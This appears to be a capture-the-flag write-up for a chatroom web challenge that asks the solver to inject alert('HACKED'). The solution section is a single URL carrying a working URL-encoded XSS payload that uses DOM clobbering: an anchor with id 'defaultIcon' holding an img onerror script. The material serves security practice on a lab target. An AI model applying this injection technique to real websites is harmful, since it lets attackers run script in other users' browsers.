# Challenge

With chatroom: https://chal39-rfh85-a4e8a8b41487.herokuapp.com (use Chrome), inject an alert("HACKED")

# Solution

```
https://chal39-rfh85-a4e8a8b41487.herokuapp.com/?username=%3Ca%20id=%22defaultIcon%22%20name=%22emoji%22%20href=%22//%3Cimg%20src=%27x%27%20onerror=%27alert(`HACKED`)%27/%3E%22%3E%3C/a%3E&messages=1,2,3
```